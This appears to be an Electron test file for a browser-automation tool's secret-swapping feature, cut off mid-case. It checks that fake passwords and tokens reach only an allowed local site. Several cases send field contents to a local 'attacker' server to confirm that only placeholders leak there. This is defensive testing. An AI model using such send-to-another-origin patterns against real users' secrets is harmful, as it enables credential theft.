// Hidden Electron windows drive the shipping secret interception against two local sites: one a
// secret is allowed for, one it is not. Every check is on what each server received. The values
// are fake, and nothing here prints a value or a placeholder: checks report a fixed sentence.
import { createHash } from "node:crypto";
import { createServer } from "node:http";
import { once } from "node:events";
import { writeFileSync } from "node:fs";
import path from "node:path";
import { app, BrowserWindow } from "electron";
import { createBrowserSecrets } from "@openwork/computer-use/browser-secrets";
import { createSecretInterception } from "../../electron/browser-secret-interception.mjs";
import { createWebMcpBroker } from "../../electron/webmcp-host.mjs";

const SESSION = "chat";
// Quotes, a backslash, non-ASCII, and the characters each form encoding escapes.
const PASSWORD = 'fake pass "q" \\ ünï ✓ 1&2=3+4 %41 <b>';
const TOKEN = "fake-token-ABC123.def";
const FILE_BYTES = Buffer.from([0xff, 0xfe, 0x00, 0x0d, 0x0a, 0x41, 0x42]);
const BIG = 2 * 1024 * 1024;

class CheckFailed extends Error {}
/** @param {unknown} condition @param {string} message a fixed sentence: never a value read from a request */
function expect(condition, message) {
  if (!condition) throw new CheckFailed(message);
}
/** Where an unexpected error came from, without its message: an engine error can quote what it was parsing. @param {unknown} error */
function whereFrom(error) {
  const name = error instanceof Error ? error.name : "error";
  const frames = error instanceof Error ? String(error.stack).split("\n").filter((line) => line.trim().startsWith("at ")).slice(0, 3).map((line) => line.trim()) : [];
  return `unexpected ${name} ${frames.join(" ")}`;
}
/** @param {number} ms */
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
/** @param {() => unknown} probe @param {number} [ms] */
async function eventually(probe, ms = 4000) {
  for (const until = Date.now() + ms; Date.now() < until;) {
    if (await probe()) return true;
    await sleep(20);
  }
  return false;
}

/** The parts of a multipart body by field name. @param {Buffer} body @param {string | undefined} contentType */
function multipart(body, contentType) {
  const boundary = /boundary=([^;]+)/.exec(contentType ?? "")?.[1];
  const parts = new Map();
  if (!boundary) return parts;
  const delimiter = Buffer.from(`--${boundary}`);
  for (let at = body.indexOf(delimiter); at !== -1;) {
    const next = body.indexOf(delimiter, at + delimiter.length);
    if (next === -1) break;
    const part = body.subarray(at + delimiter.length + 2, next - 2);
    const blank = part.indexOf("\r\n\r\n");
    const name = /name="([^"]*)"/.exec(part.subarray(0, blank).toString("latin1"))?.[1];
    if (name) parts.set(name, part.subarray(blank + 4));
    at = next;
  }
  return parts;
}

/**
 * A local site that records what it was sent under /collect and /redirect.
 * @param {(url: URL, respond: (status: number, type: string, body: string, headers?: Record<string, string>) => void) => boolean} routes
 */
async function site(routes) {
  /** @type {{ path: string, query: string, method: string, headers: import("node:http").IncomingHttpHeaders, body: Buffer }[]} */
  const requests = [];
  const server = createServer(async (request, response) => {
    const chunks = [];
    for await (const chunk of request) chunks.push(chunk);
    const url = new URL(request.url ?? "/", "http://site.example");
    /** @param {number} status @param {string} type @param {string} body @param {Record<string, string>} [headers] */
    const respond = (status, type, body, headers = {}) => {
      response.writeHead(status, { "Content-Type": type, "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*", "Cache-Control": "no-store", ...headers });
      response.end(body);
    };
    if (request.method === "OPTIONS") return respond(204, "text/plain", "");
    if (url.pathname.startsWith("/collect") || url.pathname.startsWith("/redirect")) {
      requests.push({ path: url.pathname, query: url.search, method: request.method ?? "", headers: request.headers, body: Buffer.concat(chunks) });
    }
    if (routes(url, respond)) return;
    if (url.pathname.startsWith("/collect")) return respond(200, "text/html", "<!doctype html><title>received</title>received");
    respond(404, "text/plain", "not found");
  });
  /** @type {string[]} The first text message of each WebSocket a page opened here. */
  const messages = [];
  server.on("upgrade", (request, socket) => {
    const accept = createHash("sha1").update(`${request.headers["sec-websocket-key"]}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
    socket.once("data", (frame) => {
      // One short masked text frame: two header bytes, four mask bytes, then the payload.
      const mask = frame.subarray(2, 6);
      messages.push(Buffer.from(frame.subarray(6, 6 + (frame[1] & 0x7f)).map((byte, index) => byte ^ mask[index % 4])).toString("utf8"));
      socket.end();
    });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  const port = address && typeof address === "object" ? address.port : 0;
  return {
    port, requests, messages, server,
    /** @param {string} pathname */
    received: (pathname) => requests.filter((request) => request.path === pathname),
    /** The first request to `pathname`, waiting for it. @param {string} pathname @param {number} [ms] */
    async take(pathname, ms = 4000) {
      await eventually(() => requests.some((request) => request.path === pathname), ms);
      return requests.find((request) => request.path === pathname) ?? null;
    },
  };
}

// Everything the page does with a secret goes through `field.value`: the page never has more than
// what was typed into it.
const PAGE = `<!doctype html><meta charset="utf-8"><title>secret swap</title>
<input id="field">
<form id="native" method="post" action="/collect/native-form"><input name="user" value="someone"><input id="native-field" name="password"></form>
<form id="native-redirect" method="post" action="/redirect/elsewhere?to=native"><input id="native-redirect-field" name="password"></form>
<form id="upload"><input id="upload-field" name="password"><input type="file" id="upload-file" name="file"></form>
<script>
  const field = document.getElementById("field");
  const post = (url, init) => fetch(url, { method: "POST", ...init }).then((response) => response.status, () => "failed");
  const json = (extra) => ({ headers: { "Content-Type": "application/json" }, body: JSON.stringify({ user: "someone", password: field.value, ...extra }) });
  const formData = (file) => { const data = new FormData(); data.append("password", field.value); data.append("note", "ünï"); if (file) data.append("file", file, "a.bin"); return data; };
  const send = {
    json: (url) => post(url, json()),
    big: (url) => post(url, json({ pad: "x".repeat(${BIG}) })),
    urlencoded: (url) => post(url, { body: new URLSearchParams({ user: "someone", password: field.value }) }),
    text: (url) => post(url, { headers: { "Content-Type": "text/plain" }, body: "password=" + field.value }),
    textNoCors: (url) => post(url, { mode: "no-cors", headers: { "Content-Type": "text/plain" }, body: "password=" + field.value }),
    multipart: (url) => post(url, { body: formData() }),
    multipartWithBlob: (url) => post(url, { body: formData(new Blob([new Uint8Array(${JSON.stringify([...FILE_BYTES])})])) }),
    multipartWithDiskFile: (url) => { document.getElementById("upload-field").value = field.value; return post(url, { body: new FormData(document.getElementById("upload")) }); },
    xhr: (url) => new Promise((resolve) => { const request = new XMLHttpRequest(); request.open("POST", url); request.setRequestHeader("Content-Type", "application/json"); request.onloadend = () => resolve(request.status || "failed"); request.send(json().body); }),
    beacon: (url) => navigator.sendBeacon(url, new URLSearchParams({ password: field.value })),
    worker: (url) => new Promise((resolve) => { const worker = new Worker("/worker.js"); worker.onmessage = (event) => { worker.terminate(); resolve(event.data); }; worker.postMessage({ url, body: json().body }); }),
    header: (url) => post(url, { headers: { Authorization: "Bearer " + field.value, "X-Token": field.value, "Content-Type": "application/json" }, body: "{}" }),
    query: (url) => post(url + "?password=" + field.value, json()),
    socket: (url) => new Promise((resolve) => { const socket = new WebSocket(url); socket.onopen = () => socket.send("password=" + field.value); socket.onclose = () => resolve("closed"); socket.onerror = () => resolve("failed"); }),
    frame: (url) => new Promise((resolve) => { addEventListener("message", (event) => resolve(event.data), { once: true }); [...document.querySelectorAll("iframe")].at(-1).contentWindow.postMessage({ url, body: "password=" + field.value }, "*"); }),
    many: (url, count) => Promise.all(Array.from({ length: count }, (_unused, index) => post(url + "?n=" + index, { headers: { "Content-Type": "text/plain" }, body: "n" }))),
  };
  async function timeFetches(count) {
    const times = [], began = performance.now();
    for (let index = 0; index < count; index++) { const started = performance.now(); await fetch("/ping?n=" + index).then((response) => response.arrayBuffer()); times.push(performance.now() - started); }
    const mean = (performance.now() - began) / count;
    times.sort((a, b) => a - b);
    return { mean, median: times[count >> 1], p95: times[Math.floor(count * 0.95)] };
  }
</script>`;
const WORKER = `onmessage = async (event) => postMessage(await fetch(event.data.url, { method: "POST", headers: { "Content-Type": "application/json" }, body: event.data.body }).then((response) => response.status, () => "failed"));`;
const FRAME = `<!doctype html><title>frame</title><script>onmessage = async (event) => parent.postMessage(await fetch(event.data.url, { method: "POST", headers: { "Content-Type": "text/plain" }, body: event.data.body }).then((response) => response.status, () => "failed"), "*");</script>`;
const SERVICE_WORKER = `self.addEventListener("install", () => self.skipWaiting());
self.addEventListener("activate", (event) => event.waitUntil(clients.claim()));
self.addEventListener("fetch", (event) => { if (new URL(event.request.url).pathname.startsWith("/collect/")) event.respondWith(fetch(event.request)); });`;

async function run() {
  app.commandLine.appendSwitch("disable-gpu");
  app.setPath("userData", String(process.env.OPENWORK_SECRET_SWAP_TEST_PROFILE));
  let phase = "waiting for Electron ready";
  const timeout = setTimeout(() => { console.error(`Secret swap fixture timed out: ${phase}`); app.exit(1); }, 110_000);
  await app.whenReady();
  if (process.platform === "darwin") app.dock?.hide();

  /** @type {{ origin: string }} */
  const other = { origin: "" };
  const allowed = await site((url, respond) => {
    if (url.pathname === "/") respond(200, "text/html", PAGE);
    else if (url.pathname === "/with-frame") respond(200, "text/html", `${PAGE}<iframe src="${other.origin}/frame"></iframe>`);
    else if (url.pathname === "/sw/page") respond(200, "text/html", PAGE);
    else if (url.pathname === "/sw/sw.js") respond(200, "text/javascript", SERVICE_WORKER);
    else if (url.pathname === "/worker.js") respond(200, "text/javascript", WORKER);
    else if (url.pathname === "/ping") respond(200, "text/plain", "pong");
    else if (url.pathname === "/redirect/elsewhere") respond(307, "text/plain", "", { Location: `${other.origin}/collect/redirected-${url.searchParams.get("to")}` });
    else if (url.pathname === "/redirect/same-site") respond(307, "text/plain", "", { Location: "/collect/redirected" });
    else return false;
    return true;
  });
  const attacker = await site((url, respond) => {
    if (url.pathname !== "/frame") return false;
    respond(200, "text/html", FRAME);
    return true;
  });
  // Two hosts for one loopback address: different origins, and different sites for frame isolation.
  const ALLOWED = `http://127.0.0.1:${allowed.port}`;
  const ATTACKER = other.origin = `http://localhost:${attacker.port}`;
  const diskFile = path.join(app.getPath("userData"), "upload.bin");
  writeFileSync(diskFile, FILE_BYTES);

  const secrets = createBrowserSecrets({ allowLoopbackHttp: true });
  const password = secrets.add({ sessionId: SESSION, label: "Test password", kind: "password", origins: [ALLOWED], value: PASSWORD });
  const token = secrets.add({ sessionId: SESSION, label: "Test token", kind: "token", origins: [ALLOWED], value: TOKEN });
  const interception = createSecretInterception({ secrets, hasDocument: (tab) => Reflect.get(tab, "hasDocument") === true });

  let tabs = 0;
  /** A bare window standing in for a browser tab. @param {string} [url] */
  async function openTab(url) {
    const window = new BrowserWindow({ show: false, webPreferences: { sandbox: true, contextIsolation: true, backgroundThrottling: false } });
    const tab = { tabId: `tab-${++tabs}`, hasDocument: false, window, view: { webContents: window.webContents } };
    if (url) { await window.webContents.loadURL(url); tab.hasDocument = true; }
    return tab;
  }
  /** @param {Awaited<ReturnType<typeof openTab>>} tab @param {string} code */
  const page = (tab, code) => tab.view.webContents.executeJavaScript(code, true);
  /**
   * What the task host does for `fill_secret`: arm, issue a placeholder, type it into the field.
   * @param {Awaited<ReturnType<typeof openTab>>} tab @param {{ secretRef: string }} secret @param {string} ref
   * @param {{ store?: ReturnType<typeof createBrowserSecrets>, into?: string, hooks?: ReturnType<typeof createSecretInterception> }} [options]
   */
  async function typeSecret(tab, secret, ref, { store = secrets, into = "field", hooks = interception } = {}) {
    expect(await hooks.arm(tab), "interception arms on a tab with a document");
    const { placeholder } = store.issue({ sessionId: SESSION, secretRef: secret.secretRef, tabId: tab.tabId, origin: ALLOWED, ref });
    await page(tab, `(() => { const input = document.getElementById(${JSON.stringify(into)}); input.focus(); input.select(); })()`);
    await tab.view.webContents.insertText(placeholder);
    expect(await page(tab, `document.getElementById(${JSON.stringify(into)}).value`) === placeholder, "the field holds the placeholder");
    return placeholder;
  }
  /** @param {string} tabId @param {string} ref @param {ReturnType<typeof createBrowserSecrets>} [store] */
  const statusOf = (tabId, ref, store = secrets) => store.status(SESSION, tabId).find((entry) => entry.ref === ref);

  const main = await openTab(`${ALLOWED}/`);
  /** One way a page sends the field, and what the allowed site must have received. `check` gets the recorded request. */
  /** @type {{ name: string, send: string, secret?: { secretRef: string }, check: (request: { headers: import("node:http").IncomingHttpHeaders, body: Buffer, query: string }) => void }[]} */
  const swapped = [
    { name: "fetch JSON", send: "json", check: ({ body }) => expect(JSON.parse(body.toString("utf8")).password === PASSWORD, "the JSON body carries the value") },
    { name: "fetch urlencoded", send: "urlencoded", check: ({ body }) => expect(new URLSearchParams(body.toString("utf8")).get("password") === PASSWORD, "the form body carries the value") },
    { name: "fetch text", send: "text", check: ({ body }) => expect(body.toString("utf8") === `password=${PASSWORD}`, "the text body carries the value") },
    { name: "multipart FormData", send: "multipart", check: ({ body, headers }) => {
      const parts = multipart(body, headers["content-type"]);
      expect(parts.get("password")?.toString("utf8") === PASSWORD, "the multipart field carries the value");
      expect(parts.get("note")?.toString("utf8") === "ünï", "the other multipart field is unchanged");
    } },
    { name: "multipart FormData with an in-memory file part", send: "multipartWithBlob", check: ({ body, headers }) => {
      const parts = multipart(body, headers["content-type"]);
      expect(parts.get("password")?.toString("utf8") === PASSWORD, "the multipart field carries the value");
      expect(parts.get("file")?.equals(FILE_BYTES), "the binary file part arrives byte for byte");
    } },
    { name: "XMLHttpRequest", send: "xhr", check: ({ body }) => expect(JSON.parse(body.toString("utf8")).password === PASSWORD, "the XHR body carries the value") },
    { name: "sendBeacon", send: "beacon", check: ({ body }) => expect(new URLSearchParams(body.toString("utf8")).get("password") === PASSWORD, "the beacon body carries the value") },
    { name: "web worker fetch", send: "worker", check: ({ body }) => expect(JSON.parse(body.toString("utf8")).password === PASSWORD, "the worker's body carries the value") },
    { name: "Authorization header", send: "header", secret: token, check: ({ headers }) => {
      expect(headers.authorization === `Bearer ${TOKEN}`, "the Authorization header carries the value");
      expect(headers["x-token"] === TOKEN, "the custom header carries the value");
    } },
    { name: "2 MB body", send: "big", check: ({ body }) => {
      const sent = JSON.parse(body.toString("utf8"));
      expect(sent.password === PASSWORD && sent.pad.length === BIG, "the large body carries the value and all its padding");
    } },
  ];

  /** @type {{ name: string, run: () => Promise<Record<string, number> | void> }[]} */
  const cases = [
    ...swapped.map(({ name, send, secret = password, check }, index) => ({ name: `${name} is swapped for the allowed site`, async run() {
      const ref = `swap-${index}`, target = `/collect/swap-${index}`;
      const placeholder = await typeSecret(main, secret, ref);
      await page(main, `send.${send}(${JSON.stringify(target)})`);
      const request = await allowed.take(target);
      expect(request, "the allowed site received the request");
      if (!request) return;
      expect(Number(request.headers["content-length"]) === request.body.length, "the content length matches the body sent");
      expect(!request.body.includes(placeholder) && !JSON.stringify(request.headers).includes(placeholder), "no placeholder reached the allowed site");
      check(request);
      expect(statusOf(main.tabId, ref)?.state === "sent", "the secret is reported as sent");
    } })),
    { name: "page script reading the field sees only the placeholder", async run() {
      const placeholder = await typeSecret(main, password, "read");
      const seen = await page(main, "JSON.stringify([field.value, document.documentElement.outerHTML, field.getAttribute('value')])");
      expect(seen.includes(placeholder), "the page reads the placeholder");
      for (const spelling of [PASSWORD, JSON.stringify(PASSWORD).slice(1, -1), "fake pass"]) expect(!seen.includes(spelling), "the page cannot read the value");
    } },
    { name: "a POST to another origin carries only the placeholder", async run() {
      const placeholder = await typeSecret(main, password, "other-origin");
      await page(main, `send.text(${JSON.stringify(`${ATTACKER}/collect/direct`)})`);
      const request = await attacker.take("/collect/direct");
      expect(request?.body.toString("utf8") === `password=${placeholder}`, "the other site received exactly the placeholder");
      expect(statusOf(main.tabId, "other-origin")?.reason === "other_origin", "the secret is reported as not sent to another origin");
    } },
    { name: "a placeholder in a query string is never swapped", async run() {
      const placeholder = await typeSecret(main, password, "query");
      await page(main, `send.query("/collect/query")`);
      const request = await allowed.take("/collect/query");
      expect(request?.query === `?password=${placeholder}`, "the address keeps the placeholder");
      expect(request && JSON.parse(request.body.toString("utf8")).password === placeholder, "the body of that request keeps the placeholder too");
      expect(statusOf(main.tabId, "query")?.reason === "in_url", "the secret is reported as left in the address");
    } },
    { name: "a WebSocket message is never rewritten, even to the allowed site", async run() {
      const placeholder = await typeSecret(main, password, "socket");
      await page(main, `send.socket(${JSON.stringify(`${ALLOWED.replace("http:", "ws:")}/socket`)})`);
      expect(await eventually(() => allowed.messages.length === 1), "the allowed site received the message");
      expect(allowed.messages[0] === `password=${placeholder}`, "the message carries exactly the placeholder");
    } },
    { name: "a 307 to another origin never delivers the value there", async run() {
      // Chromium repeats the body it sent on a redirect it follows itself, so that hop holds the
      // value and is failed. A CORS fetch is restarted by the page's loader with the page's own body.
      const hops = [
        { to: "cors", restarted: true, submit: `send.json("/redirect/elsewhere?to=cors")` },
        { to: "no-cors", restarted: false, submit: `send.textNoCors("/redirect/elsewhere?to=no-cors")` },
        { to: "native", restarted: false, into: "native-redirect-field", submit: `document.getElementById("native-redirect").submit()` },
      ];
      for (const { to, restarted, into, submit } of hops) {
        const placeholder = await typeSecret(main, password, `redirect-${to}`, into ? { into } : {});
        const before = allowed.received("/redirect/elsewhere").length;
        const settled = to === "native" ? once(main.view.webContents, "did-fail-load") : null;
        const outcome = await page(main, submit);
        await settled;
        await eventually(() => allowed.received("/redirect/elsewhere").length > before);
        const first = allowed.received("/redirect/elsewhere")[before];
        expect([JSON.stringify(PASSWORD), `password=${PASSWORD}`, new URLSearchParams({ password: PASSWORD }).toString()].some((sent) => first?.body.includes(sent)), "the allowed site received the value on the first hop");
        await sleep(300);
        const arrived = attacker.received(`/collect/redirected-${to}`);
        if (restarted) {
          expect(arrived.length === 1 && JSON.parse(arrived[0].body.toString("utf8")).password === placeholder, "a restarted request reaches the other site with exactly the placeholder");
        } else {
          expect(arrived.length === 0, "the other site received nothing from the redirect");
          expect(to === "native" || outcome === "failed", "the page sees the redirected request fail");
        }
        if (to === "native") await main.view.webContents.loadURL(`${ALLOWED}/`);
      }
      for (const request of attacker.requests) for (const spelling of [PASSWORD, JSON.stringify(PASSWORD).slice(1, -1), encodeURIComponent(PASSWORD), new URLSearchParams({ p: PASSWORD }).toString().slice(2)]) {
        expect(!request.body.includes(spelling) && !request.query.includes(spelling) && !JSON.stringify(request.headers).includes(spelling), "the other site never received the value");
      }
    } },
    { name: "a 307 within the allowed origin still carries the value", async run() {
      await typeSecret(main, password, "redirect-same");
      await page(main, `send.json("/redirect/same-site")`);
      const second = await allowed.take("/collect/redirected");
      expect(second && JSON.parse(second.body.toString("utf8")).password === PASSWORD, "the second hop carries the value");
    } },
    { name: "a multipart body with a file read from disk is blocked, not guessed", async run() {
      const placeholder = await typeSecret(main, password, "disk-file");
      const cdp = main.view.webContents.debugger;
      const { root } = await cdp.sendCommand("DOM.getDocument");
      const { nodeId } = await cdp.sendCommand("DOM.querySelector", { nodeId: root.nodeId, selector: "#upload-file" });
      await cdp.sendCommand("DOM.setFileInputFiles", { files: [diskFile], nodeId });
      const outcome = await page(main, `send.multipartWithDiskFile("/collect/disk-file")`);
      expect(outcome === "failed", "the request is blocked");
      await sleep(200);
      expect(allowed.received("/collect/disk-file").length === 0, "the allowed site received nothing");
      expect(statusOf(main.tabId, "disk-file")?.reason === "unsupported_encoding", "the secret is reported as not sent");
      // Without a placeholder in it, the same upload goes through untouched.
      await page(main, `(() => { field.value = "nothing secret"; })()`);
      expect(await page(main, `send.multipartWithDiskFile("/collect/disk-file-plain")`) === 200, "an upload without a placeholder is not blocked");
      const plain = await allowed.take("/collect/disk-file-plain");
      expect(plain && multipart(plain.body, plain.headers["content-type"]).get("file")?.equals(FILE_BYTES), "the file arrives byte for byte");
      expect(!plain?.body.includes(placeholder), "no placeholder was sent");
    } },
    { name: "the session webRequest hook still sees and can cancel requests", async run() {
      /** @type {string[]} */
      const seen = [];
      const { webRequest } = main.view.webContents.session;
      webRequest.onBeforeRequest({ urls: ["<all_urls>"] }, (details, callback) => { seen.push(new URL(details.url).pathname); callback({ cancel: details.url.includes("/collect/cancelled") }); });
      try {
        await typeSecret(main, password, "web-request");
        await page(main, `send.json("/collect/web-request")`);
        const request = await allowed.take("/collect/web-request");
        expect(request && JSON.parse(request.body.toString("utf8")).password === PASSWORD, "the request is swapped with the hook installed");
        expect(seen.includes("/collect/web-request"), "the hook saw the request");
        expect(await page(main, `send.json("/collect/cancelled")`) === "failed", "the hook can still cancel a request");
        await sleep(200);
        expect(allowed.received("/collect/cancelled").length === 0, "a cancelled request never reaches the site");
      } finally { webRequest.onBeforeRequest(null); }
    } },
    { name: "a native form POST is swapped", async run() {
      const placeholder = await typeSecret(main, password, "native-form", { into: "native-field" });
      const loaded = once(main.view.webContents, "did-finish-load");
      await page(main, `document.getElementById("native").submit()`);
      const request = await allowed.take("/collect/native-form");
      await loaded;
      const sent = new URLSearchParams(request?.body.toString("utf8"));
      expect(sent.get("password") === PASSWORD && sent.get("user") === "someone", "the form body carries the value");
      expect(Number(request?.headers["content-length"]) === request?.body.length, "the content length matches the body sent");
      expect(!request?.body.includes(placeholder), "no placeholder reached the allowed site");
      await main.view.webContents.loadURL(`${ALLOWED}/`);
    } },
    { name: "arming twice at once attaches once and stays armed", async run() {
      const tab = await openTab(`${ALLOWED}/`);
      const cdp = tab.view.webContents.debugger;
      let attaches = 0;
      const attach = cdp.attach.bind(cdp);
      cdp.attach = (version) => { attaches++; attach(version); };
      const results = await Promise.all([interception.arm(tab), interception.arm(tab), interception.arm(tab)]);
      expect(results.every(Boolean) && attaches === 1, "three concurrent arms resolve true on one attach");
      expect(await interception.arm(tab) && attaches === 1 && interception.holds(tab), "arming again is a no-op");
      await interception.release(tab);
      expect(!interception.holds(tab) && !cdp.isAttached(), "release detaches the debugger this module attached");
      tab.window.destroy();
    } },
    { name: "a cross-site frame's requests are judged like the page's", async run() {
      // The debugger stays attached for someone else here, so only this module's own cleanup can free the frames.
      const hooks = createSecretInterception({ secrets, keepDebugger: () => true });
      const tab = await openTab(`${ALLOWED}/with-frame`);
      const contents = tab.view.webContents;
      await eventually(() => contents.mainFrame.framesInSubtree.some((frame) => frame.url.startsWith(ATTACKER)));
      expect(new Set(contents.mainFrame.framesInSubtree.map((frame) => frame.processId)).size === 2, "the frame runs in its own process");
      contents.debugger.attach("1.3");
      const placeholder = await typeSecret(tab, password, "frame", { hooks });
      /** Sends the field from the newest frame. @param {string} origin @param {string} pathname */
      const fromFrame = (origin, pathname) => page(tab, `send.frame(${JSON.stringify(origin + pathname)})`);
      expect(await fromFrame(ALLOWED, "/collect/from-frame") === 200, "the frame's request to the allowed site succeeds");
      expect((await allowed.take("/collect/from-frame"))?.body.toString("utf8") === `password=${PASSWORD}`, "the frame's request to the allowed site carries the value");
      await fromFrame(ATTACKER, "/collect/from-frame");
      expect((await attacker.take("/collect/from-frame"))?.body.toString("utf8") === `password=${placeholder}`, "the frame's request to its own site carries only the placeholder");
      // A frame added after arming is found too.
      await page(tab, `new Promise((resolve) => { const frame = document.createElement("iframe"); frame.onload = () => resolve(true); frame.src = ${JSON.stringify(`${ATTACKER}/frame`)}; document.body.append(frame); })`);
      await fromFrame(ALLOWED, "/collect/from-late-frame");
      expect((await allowed.take("/collect/from-late-frame"))?.body.toString("utf8") === `password=${PASSWORD}`, "a later frame's request to the allowed site carries the value");
      await hooks.release(tab);
      let paused = 0;
      contents.debugger.on("message", (_event, method) => { if (method === "Fetch.requestPaused") paused++; });
      expect(contents.debugger.isAttached(), "the debugger someone else attached is left attached");
      expect(await fromFrame(ATTACKER, "/collect/after-release") === 200 && await page(tab, `send.json("/collect/after-release")`) === 200 && paused === 0, "no request of the page or its frames pauses after release");
      expect((await attacker.take("/collect/after-release"))?.body.toString("utf8") === `password=${placeholder}`, "after release a frame's request is sent as written");
      await hooks.dispose();
      tab.window.destroy();
    } },
    { name: "a service worker forwarding a request is intercepted too", async run() {
      const tab = await openTab(`${ALLOWED}/sw/page`);
      await page(tab, `navigator.serviceWorker.register("/sw/sw.js", { scope: "/sw/" }).then(() => navigator.serviceWorker.ready).then(() => navigator.serviceWorker.controller || new Promise((resolve) => navigator.serviceWorker.addEventListener("controllerchange", resolve))).then(() => true)`);
      const placeholder = await typeSecret(tab, password, "service-worker");
      expect(await page(tab, `send.json("/collect/through-service-worker")`) === 200, "the forwarded request succeeds");
      const request = await allowed.take("/collect/through-service-worker");
      expect(request && JSON.parse(request.body.toString("utf8")).password === PASSWORD, "the forwarded request carries the value");
      expect(!request?.body.includes(placeholder), "no placeholder reached the allowed site");
      await interception.release(tab);
      expect(await page(tab, `send.json("/collect/service-worker-after-release")`) === 200, "forwarded requests go on after release");
      await page(tab, `navigator.serviceWorker.getRegistration("/sw/").then((registration) => registration?.unregister())`);
      tab.window.destroy();
    } },
    { name: "interception is removed, and the debugger detached, once the placeholder expires", async run() {
      const store = createBrowserSecrets({ allowLoopbackHttp: true, placeholderTtlMs: 300 });
      const secret = store.add({ sessionId: SESSION, label: "Short", kind: "password", origins: [ALLOWED], value: PASSWORD });
      const hooks = createSecretInterception({ secrets: store, armGraceMs: 50 });
      const tab = await openTab(`${ALLOWED}/`);
      const cdp = tab.view.webContents.debugger;
      await typeSecret(tab, secret, "expires", { store, hooks });
      expect(cdp.isAttached() && hooks.holds(tab) && store.live(tab.tabId), "interception is on while the placeholder lives");
      expect(await eventually(() => !hooks.holds(tab)), "interception ends after the placeholder expires");
      expect(!cdp.isAttached(), "the debugger this module attached is detached");
      expect(statusOf(tab.tabId, "expires", store)?.reason === "expired", "the secret is reported as expired");
      await page(tab, `send.json("/collect/after-expiry")`);
      const request = await allowed.take("/collect/after-expiry");
      expect(request && !request.body.includes(PASSWORD), "a request after expiry is sent as the page wrote it");
      await hooks.dispose();
      tab.window.destroy();
    } },
    { name: "a debugger someone else attached stays attached, without interception", async run() {
      const store = createBrowserSecrets({ allowLoopbackHttp: true, placeholderTtlMs: 300 });
      const secret = store.add({ sessionId: SESSION, label: "Short", kind: "password", origins: [ALLOWED], value: PASSWORD });
      let wanted = true;
      const hooks = createSecretInterception({ secrets: store, armGraceMs: 50, keepDebugger: () => wanted });
      const tab = await openTab(`${ALLOWED}/`);
      const cdp = tab.view.webContents.debugger;
      cdp.attach("1.3");
      let paused = 0;
      await typeSecret(tab, secret, "shared", { store, hooks });
      expect(await eventually(() => !hooks.holds(tab)), "interception ends after the placeholder expires");
      expect(cdp.isAttached(), "the debugger someone else attached is left attached");
      cdp.on("message", (_event, method) => { if (method === "Fetch.requestPaused") paused++; });
      expect(await page(tab, `send.json("/collect/shared-after")`) === 200 && paused === 0, "no request pauses once interception is off");
      // The other user of the debugger is done while interception holds it: it goes when interception does.
      await typeSecret(tab, secret, "shared-again", { store, hooks });
      hooks.detachOnRelease(tab);
      wanted = false;
      expect(cdp.isAttached(), "a detach asked for while interception holds the tab waits");
      expect(await eventually(() => !cdp.isAttached()), "the held-back detach happens when interception ends");
      await hooks.dispose();
      tab.window.destroy();
    } },
    { name: "requests in flight are answered, not left paused, when interception is removed", async run() {
      const tab = await openTab(`${ALLOWED}/`);
      await typeSecret(tab, password, "in-flight");
      const sending = page(tab, `send.many("/collect/in-flight", 60)`);
      await interception.release(tab);
      const outcomes = await sending;
      expect(outcomes.length === 60 && outcomes.every((status) => status === 200), "every request completes");
      tab.window.destroy();
    } },
    { name: "arming a tab with no document resolves false without attaching", async run() {
      const tab = await openTab();
      const started = Date.now();
      expect(await interception.arm(tab) === false, "arming resolves false");
      expect(Date.now() - started < 1000 && !tab.view.webContents.debugger.isAttached() && !interception.holds(tab), "nothing was attached and nothing waited");
      // Even when the host's check wrongly says there is a document, arming settles.
      const hooks = createSecretInterception({ secrets, commandTimeoutMs: 1500 });
      const settled = await Promise.race([hooks.arm(tab).then(() => true), sleep(8000).then(() => false)]);
      expect(settled, "arming a blank tab settles instead of hanging");
      await hooks.dispose();
      await tab.view.webContents.loadURL(`${ALLOWED}/`);
      expect(await page(tab, `send.json("/collect/blank-then-loaded")`) === 200, "the tab still loads and sends afterwards");
      tab.window.destroy();
    } },
    { name: "a debugger detached underneath revokes the placeholder", async run() {
      const tab = await openTab(`${ALLOWED}/`);
      const placeholder = await typeSecret(tab, password, "detached");
      tab.view.webContents.debugger.detach();
      expect(await eventually(() => !secrets.live(tab.tabId)), "the tab has no live placeholder");
      expect(!interception.holds(tab), "interception no longer holds the tab");
      expect(statusOf(tab.tabId, "detached")?.reason === "interception_lost", "the secret is reported as not sent");
      await page(tab, `send.json("/collect/after-detach")`);
      const request = await allowed.take("/collect/after-detach");
      expect(request && JSON.parse(request.body.toString("utf8")).password === placeholder, "a later request carries only the placeholder");
      tab.window.destroy();
    } },
    { name: "a crashed renderer ends interception and leaves the tab usable", async run() {
      const hooks = createSecretInterception({ secrets, keepDebugger: () => true });
      const tab = await openTab(`${ALLOWED}/`);
      const contents = tab.view.webContents;
      contents.debugger.attach("1.3");
      await typeSecret(tab, password, "crashed", { hooks });
      const gone = once(contents, "render-process-gone");
      contents.forcefullyCrashRenderer();
      await gone;
      expect(!secrets.live(tab.tabId), "the placeholder is revoked at once");
      expect(await eventually(() => !hooks.holds(tab)), "interception is removed");
      expect(statusOf(tab.tabId, "crashed")?.reason === "interception_lost", "the secret is reported as not sent");
      await contents.loadURL(`${ALLOWED}/`);
      expect(await page(tab, `send.json("/collect/after-crash")`) === 200, "the reloaded page's requests are not left paused");
      await hooks.dispose();
      tab.window.destroy();
    } },
    { name: "site tools and their results leave the broker redacted", async run() {
      const { placeholder } = secrets.issue({ sessionId: SESSION, secretRef: password.secretRef, tabId: "site-tools", origin: ALLOWED, ref: "site-tools" });
      const spellings = [PASSWORD, JSON.stringify(PASSWORD).slice(1, -1), Buffer.from(PASSWORD).toString("base64"), placeholder];
      /** @param {unknown} value */
      const clean = (value) => { const text = JSON.stringify(value); return spellings.every((spelling) => !text.includes(spelling)); };
      const frame = { url: `${ALLOWED}/`, framesInSubtree: [] };
      const tab = { tabId: "site-tools", webMcpRevision: 0, view: { webContents: { isDestroyed: () => false, getURL: () => frame.url, mainFrame: frame } } };
